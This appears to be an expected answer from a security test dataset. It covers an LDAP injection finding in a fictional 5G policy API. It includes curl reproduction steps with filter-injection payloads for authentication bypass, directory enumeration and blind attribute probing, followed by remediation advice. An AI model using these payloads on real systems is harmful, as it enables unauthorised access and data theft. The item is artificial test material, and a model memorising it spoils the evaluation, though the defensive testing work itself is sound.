# Expected Response

## System
- System: SpectreNet Policy Control v4.2.0
- Domain: TELECOM / 5G CORE
- Example ID: INJ-0115
- Risk ID: RISK-INJ-115
- Vulnerability: LDAP Injection (LDAPi)

## Findings

### 1. LDAP Injection on `/api/v1/records?username=` (HAR Primary)

The `username` parameter is passed unsanitized to a corporate directory services (LDAP) lookup (Section 2.0: "corporate directory services — primary data store"). The payload `admin)(&(password=*))` injects LDAP filter operators to bypass the username filter, causing the directory to return all entries matching any password — authentication bypass plus full directory enumeration.

**Note on internal inconsistency:** The code snippet (Section 3.0) shows raw SQL string concatenation (`SELECT * FROM records WHERE username = '...'`) which conflicts with the declared LDAP/corporate directory architecture. The HAR payload is an LDAP filter injection (`admin)(&(password=*))`) and the declared vulnerability is LDAP Injection. Primary demonstration uses LDAPi; the SQL path is noted as a secondary code-path debt.

**Evidence from HAR:**
- Endpoint: `GET /api/v1/records?username=admin)(&(password=*))`
- LDAP filter constructed: `(&(username=admin)(&(password=*)))` — password wildcard always matches
- Response: HTTP 200 with admin and user records including `password_hash` and `role: "ADMIN"`

## Reproduction

**Step 1 — Baseline:**
```bash
curl -s "https://api.spectrenet-poli.example.com/api/v1/records?username=normaluser" \
  -H "Authorization: Bearer <VALID_TOKEN>"
```
**Expected:** Returns matching directory entry for `normaluser` only.

**Step 2 — LDAP authentication bypass (primary HAR attack):**
```bash
curl -s "https://api.spectrenet-poli.example.com/api/v1/records?username=admin)(%26(password%3D*))" \
  -H "Authorization: Bearer <VALID_TOKEN>"
```
**Vulnerable outcome:** Admin and all other user records returned — authentication bypass via LDAP filter operator injection.

**Step 3 — LDAP wildcard: enumerate all directory entries:**
```bash
curl -s "https://api.spectrenet-poli.example.com/api/v1/records?username=*" \
  -H "Authorization: Bearer <VALID_TOKEN>"
```
**Vulnerable outcome:** All directory entries returned — full subscriber/staff directory enumeration. In Telecom/5G Core, this exposes network policy records, subscriber identities, and infrastructure service accounts.

**Step 4 — LDAP blind injection: test for attribute existence:**
```bash
curl -s "https://api.spectrenet-poli.example.com/api/v1/records?username=admin)(cn%3D*" \
  -H "Authorization: Bearer <VALID_TOKEN>"
```
**Vulnerable outcome:** Returns results if `cn` attribute exists in directory — blind LDAP attribute enumeration for schema discovery.

**Step 5 — Verbose error confirmation:**
```bash
curl -s "https://api.spectrenet-poli.example.com/api/v1/records?username=%28" \
  -H "Authorization: Bearer <VALID_TOKEN>"
```
**Expected verbose error:** LDAP filter parse error leaking directory service details, attribute names, or server version.

## Secure Outcome
```json
{ "error": "Invalid input", "code": 400 }
```

## Remediation
- **LDAP input escaping (RISK-INJ-115):** Escape all LDAP special characters in user input (`(`, `)`, `*`, `\`, `NUL`). Use LDAP SDK's built-in escaping: e.g., `ldap.escape(req.query.username)` or `javax.naming.directory.SearchControls` with parameter binding.
- **Use positional LDAP filter parameters:** Construct filters using parameterized values, not string concatenation.
- **Restrict LDAP account:** The application service account should only have read access to required OU trees — not full directory admin.
- **Disable wildcard searches in directory:** Configure LDAP server to reject wildcard-only filter values.
- **Deploy input validation middleware:** Reject LDAP metacharacters in query parameters.
- **Disable verbose error messages in production.**
